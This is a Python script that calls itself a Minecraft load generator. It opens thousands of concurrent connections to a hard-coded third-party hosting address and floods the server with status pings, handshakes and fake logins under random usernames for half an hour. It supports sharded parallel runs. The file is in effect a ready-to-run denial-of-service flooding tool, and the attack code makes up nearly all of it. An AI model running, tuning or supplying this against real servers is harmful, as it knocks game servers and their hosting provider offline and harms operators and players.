# mc_load.py — Minecraft load generator, async multi-vector
# python 3.12 | stdlib only (asyncio)

import asyncio
import os
import random
import signal
import struct
import string
import sys
import time

HOST     = os.environ.get("HOST", "business3.astrixhost.web.id")
PORT     = int(os.environ.get("PORT", "5080"))
MODE     = os.environ.get("MODE", "mixed")   # status|handshake|join|mixed
DURATION = int(os.environ.get("DURATION", "1800"))
CONC     = int(os.environ.get("CONC", "2000"))
SHARD    = os.environ.get("SHARD", "0")

CONNECT_TIMEOUT  = 5.0
READ_TIMEOUT     = 3.0
PROTOCOL_VERSION = 763   # 1.20.1 — ganti sesuai versi server

STATE_STATUS = 1
STATE_LOGIN  = 2


# ---- varint helpers ----
def vi_write(v: int) -> bytes:
    out = b""
    while True:
        b = v & 0x7F
        v >>= 7
        if v:
            out += bytes([b | 0x80])
        else:
            out += bytes([b])
            return out


def pack_string(s: str) -> bytes:
    r = s.encode("utf-8")
    return vi_write(len(r)) + r


def pack_packet(pid: int, payload: bytes = b"") -> bytes:
    body = vi_write(pid) + payload
    return vi_write(len(body)) + body


def handshake(host: str, port: int, state: int) -> bytes:
    p = (vi_write(PROTOCOL_VERSION) + pack_string(host)
         + struct.pack(">H", port) + vi_write(state))
    return pack_packet(0x00, p)


# ---- stats ----
class Stats:
    def __init__(self):
        self.conn = 0
        self.fail = 0
        self.bytes = 0
        self.start = time.time()
        self.lock = asyncio.Lock()

    async def inc(self, ok: int = 0, fail: int = 0, b: int = 0):
        async with self.lock:
            self.conn += ok
            self.fail += fail
            self.bytes += b

    def snap(self) -> str:
        dt = max(1e-6, time.time() - self.start)
        return (f"[shard {SHARD}] conn={self.conn} fail={self.fail} "
                f"rate={self.conn / dt:.0f} conn/s bytes={self.bytes}")


STATS = Stats()
STOP = asyncio.Event()


# ---- worker: status ping ----
async def worker_status():
    while not STOP.is_set():
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
            w.write(handshake(HOST, PORT, STATE_STATUS))
            w.write(pack_packet(0x00))
            await w.drain()
            try:
                length_b = await asyncio.wait_for(
                    r.readexactly(1), READ_TIMEOUT)
                length = length_b[0] & 0x7F
                shift = 7
                while length_b[0] & 0x80:
                    length_b = await asyncio.wait_for(
                        r.readexactly(1), READ_TIMEOUT)
                    length |= (length_b[0] & 0x7F) << shift
                    shift += 7
                data = await asyncio.wait_for(
                    r.readexactly(length), READ_TIMEOUT)
                ts = int(time.time() * 1000) & 0x7FFFFFFFFFFFFFFF
                w.write(pack_packet(0x01, struct.pack(">q", ts)))
                await w.drain()
                try:
                    await asyncio.wait_for(
                        r.readexactly(10), READ_TIMEOUT)
                except Exception:
                    pass
                await STATS.inc(ok=1, b=len(data))
            except Exception:
                await STATS.inc(fail=1)
            try:
                w.close()
            except Exception:
                pass
        except (asyncio.TimeoutError, OSError):
            await STATS.inc(fail=1)


# ---- worker: handshake only ----
async def worker_handshake():
    pkt = handshake(HOST, PORT, STATE_STATUS) + pack_packet(0x00)
    while not STOP.is_set():
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
            w.write(pkt)
            await w.drain()
            w.close()
            await STATS.inc(ok=1)
        except (asyncio.TimeoutError, OSError):
            await STATS.inc(fail=1)


# ---- worker: join ----
def rand_name() -> str:
    return "".join(random.choices(
        string.ascii_letters + string.digits,
        k=random.randint(3, 16)))


async def worker_join():
    while not STOP.is_set():
        try:
            r, w = await asyncio.wait_for(
                asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
            w.write(handshake(HOST, PORT, STATE_LOGIN))
            w.write(pack_packet(0x00, pack_string(rand_name())))
            await w.drain()
            await asyncio.sleep(random.uniform(0.3, 1.2))
            w.close()
            await STATS.inc(ok=1)
        except (asyncio.TimeoutError, OSError):
            await STATS.inc(fail=1)


# ---- one-shot helpers untuk mixed ----
async def one_status():
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(handshake(HOST, PORT, STATE_STATUS) + pack_packet(0x00))
        await w.drain()
        w.close()
        await STATS.inc(ok=1)
    except Exception:
        await STATS.inc(fail=1)


async def one_handshake():
    pkt = handshake(HOST, PORT, STATE_STATUS) + pack_packet(0x00)
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(pkt)
        await w.drain()
        w.close()
        await STATS.inc(ok=1)
    except Exception:
        await STATS.inc(fail=1)


async def one_join():
    try:
        r, w = await asyncio.wait_for(
            asyncio.open_connection(HOST, PORT), CONNECT_TIMEOUT)
        w.write(handshake(HOST, PORT, STATE_LOGIN))
        w.write(pack_packet(0x00, pack_string(rand_name())))
        await w.drain()
        await asyncio.sleep(random.uniform(0.2, 0.8))
        w.close()
        await STATS.inc(ok=1)
    except Exception:
        await STATS.inc(fail=1)


# ---- worker: mixed ----
async def worker_mixed():
    while not STOP.is_set():
        r = random.random()
        if r < 0.4:
            await one_status()
        elif r < 0.7:
            await one_handshake()
        else:
            await one_join()


# ---- reporter ----
async def reporter():
    while not STOP.is_set():
        await asyncio.sleep(5)
        print(STATS.snap(), flush=True)


# ---- main ----
async def main():
    print(f"[shard {SHARD}] target={HOST}:{PORT} mode={MODE} "
          f"conc={CONC} dur={DURATION}s", flush=True)

    worker_map = {
        "status":    worker_status,
        "handshake": worker_handshake,
        "join":      worker_join,
        "mixed":     worker_mixed,
    }
    wk = worker_map.get(MODE, worker_mixed)

    tasks = [asyncio.create_task(wk()) for _ in range(CONC)]
    rep = asyncio.create_task(reporter())

    try:
        await asyncio.sleep(DURATION)
    finally:
        STOP.set()
        rep.cancel()
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

    print(STATS.snap(), flush=True)


def _sig(s, f):
    STOP.set()


if __name__ == "__main__":
    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        sys.exit(0)
